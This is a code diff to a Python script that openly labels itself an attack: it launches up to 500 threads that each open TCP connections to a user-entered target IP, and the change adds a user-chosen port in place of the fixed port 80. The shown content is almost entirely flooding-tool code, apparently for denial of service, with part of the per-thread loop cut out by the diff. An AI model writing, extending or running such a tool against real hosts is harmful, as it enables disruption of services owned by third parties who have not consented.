@@ -2,7 +2,8 @@ import socket
 import threading
 from threading import Event
 
-def attack(stop_event: Event, target):
+def attack(stop_event: Event, target, port):
+    port = int(port)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(1)
     s.connect((target, port))
@@ -19,21 +20,21 @@ def attack(stop_event: Event, target):
             continue
     s.close()
 
-def main(stop_event: Event, target_ip):
+def main(stop_event: Event, target_ip, target_port):
     print("Executing attack...")
     for i in range(500):
         if stop_event.is_set() is not True:
-            thread = threading.Thread(target=attack, args=(stop_event, target_ip))
+            thread = threading.Thread(target=attack, args=(stop_event, target_ip, target_port))
             thread.start()
         else:
             break
 
 if __name__ == "__main__":
-    target = input("Enter target IP: ")
-    port = 80
+    target_ip = input("Enter target IP: ")
+    target_port = input("Enter port: ")
     stop_event = threading.Event() 
     try:
-        main_thread = threading.Thread(target=main, args=(stop_event, target))
+        main_thread = threading.Thread(target=main, args=(stop_event, target_ip, target_port))
         main_thread.start()
         while stop_event.is_set() is not True:
             continue
